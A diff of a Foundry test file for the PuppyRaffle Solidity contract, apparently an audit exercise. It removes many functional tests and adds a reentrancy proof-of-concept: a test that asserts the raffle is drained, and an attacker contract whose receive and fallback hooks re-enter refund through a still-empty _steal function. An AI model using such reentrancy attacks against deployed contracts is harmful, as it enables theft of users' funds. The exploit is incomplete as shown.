@@ -19,110 +19,6 @@ contract PuppyRaffleTest is Test {
         puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
-    //////////////////////
-    /// EnterRaffle    ///
-    /////////////////////
-
-    function testCanEnterRaffle() public {
-        address[] memory players = new address[](1);
-        players[0] = playerOne;
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-        assertEq(puppyRaffle.players(0), playerOne);
-    }
-
-    function testCantEnterWithoutPaying() public {
-        address[] memory players = new address[](1);
-        players[0] = playerOne;
-        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
-        puppyRaffle.enterRaffle(players);
-    }
-
-    function testCanEnterRaffleMany() public {
-        address[] memory players = new address[](2);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
-        assertEq(puppyRaffle.players(0), playerOne);
-        assertEq(puppyRaffle.players(1), playerTwo);
-    }
-
-    function testCantEnterWithoutPayingMultiple() public {
-        address[] memory players = new address[](2);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-    }
-
-    function testCantEnterWithDuplicatePlayers() public {
-        address[] memory players = new address[](2);
-        players[0] = playerOne;
-        players[1] = playerOne;
-        vm.expectRevert("PuppyRaffle: Duplicate player");
-        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
-    }
-
-    function testCantEnterWithDuplicatePlayersMany() public {
-        address[] memory players = new address[](3);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerOne;
-        vm.expectRevert("PuppyRaffle: Duplicate player");
-        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
-    }
-
-    //////////////////////
-    /// Refund         ///
-    /////////////////////
-    modifier playerEntered() {
-        address[] memory players = new address[](1);
-        players[0] = playerOne;
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-        _;
-    }
-
-    function testCanGetRefund() public playerEntered {
-        uint256 balanceBefore = address(playerOne).balance;
-        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-
-        vm.prank(playerOne);
-        puppyRaffle.refund(indexOfPlayer);
-
-        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
-    }
-
-    function testGettingRefundRemovesThemFromArray() public playerEntered {
-        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-
-        vm.prank(playerOne);
-        puppyRaffle.refund(indexOfPlayer);
-
-        assertEq(puppyRaffle.players(0), address(0));
-    }
-
-    function testOnlyPlayerCanRefundThemself() public playerEntered {
-        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-        vm.expectRevert("PuppyRaffle: Only the player can refund");
-        vm.prank(playerTwo);
-        puppyRaffle.refund(indexOfPlayer);
-    }
-
-    //////////////////////
-    /// getActivePlayerIndex         ///
-    /////////////////////
-    function testGetActivePlayerIndexManyPlayers() public {
-        address[] memory players = new address[](2);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
-
-        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
-        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
-    }
-
-    //////////////////////
-    /// selectWinner         ///
-    /////////////////////
     modifier playersEntered() {
         address[] memory players = new address[](4);
         players[0] = playerOne;
@@ -133,87 +29,64 @@ contract PuppyRaffleTest is Test {
         _;
     }
 
-    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
-        vm.expectRevert("PuppyRaffle: Raffle not over");
-        puppyRaffle.selectWinner();
-    }
-
-    function testCantSelectWinnerWithFewerThanFourPlayers() public {
-        address[] memory players = new address[](3);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = address(3);
-        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
-
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-
-        vm.expectRevert("PuppyRaffle: Need at least 4 players");
-        puppyRaffle.selectWinner();
-    }
-
-    function testSelectWinner() public playersEntered {
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-
-        puppyRaffle.selectWinner();
-        assertEq(puppyRaffle.previousWinner(), playerFour);
-    }
-
-    function testSelectWinnerGetsPaid() public playersEntered {
-        uint256 balanceBefore = address(playerFour).balance;
-
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-
-        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);
-
-        puppyRaffle.selectWinner();
-        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
-    }
-
-    function testSelectWinnerGetsAPuppy() public playersEntered {
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-
-        puppyRaffle.selectWinner();
-        assertEq(puppyRaffle.balanceOf(playerFour), 1);
-    }
-
-    function testPuppyUriIsRight() public playersEntered {
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-
-        string memory expectedTokenUri =
-            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
-
-        puppyRaffle.selectWinner();
-        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
-    }
-
-    //////////////////////
-    /// withdrawFees         ///
-    /////////////////////
-    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
-        vm.expectRevert("PuppyRaffle: There are currently players active!");
-        puppyRaffle.withdrawFees();
-    }
-
-    function testWithdrawFees() public playersEntered {
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-
-        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;
-
-        puppyRaffle.selectWinner();
-        puppyRaffle.withdrawFees();
-        assertEq(address(feeAddress).balance, expectedPrizeAmount);
-    }
     ////////////////////////////////////////////////////////////
     ////////////   reentrancy tests  ///////////////////////////
     ////////////////////////////////////////////////////////////
 
-    function test_ReentranctyInRefund() public {}
+    function test_ReentranctyInRefund() public playersEntered {
+        // arrange
+        // address[] memory players = new address[](4);
+        // players[0] = playerOne;
+        // players[1] = playerTwo;
+        // players[2] = playerThree;
+        // players[3] = playerFour;
+        // puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        // initialize the contract
+        ReentrancyAttackerContract attackerContract = new ReentrancyAttackerContract(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, entranceFee);
+        uint256 attackerContractBalanceBefore = address(attackerContract).balance;
+        uint256 puppyRaffleContractBalanceBefore = address(puppyRaffle).balance;
+
+        // attack!  steal monies!!!
+        vm.prank(attacker);
+        attackerContract.attack();
+        console.log("attacker contract balance after attack", address(attackerContract).balance);
+        console.log("puppy raffle contract balance after attack", address(puppyRaffle).balance);
+
+        // assert
+        assertEq(address(attackerContract).balance, puppyRaffleContractBalanceBefore + attackerContractBalanceBefore);
+        assertEq(address(puppyRaffle).balance, 0);
+    }
 }
 
-contract ReentrancyAttackerContract {}
+contract ReentrancyAttackerContract {
+    PuppyRaffle puppyRaffle;
+    uint256 public s_entranceFee; // we'll get this from calling puppyRaffle.entranceFee()
+    uint256 public s_attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffleInstance) {
+        puppyRaffle = _puppyRaffleInstance; // Initializing the state variable
+        s_entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        // get the attacker in and call refund
+        address[] memory attackers = new address[](1);
+        attackers[0] = address(this);
+        puppyRaffle.enterRaffle{value: s_entranceFee}(attackers);
+        s_attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(s_attackerIndex);
+    }
+
+    function _steal() internal {}
+
+    receive() external payable {
+        _steal();
+    }
+
+    fallback() external payable {
+        _steal();
+    }
+}
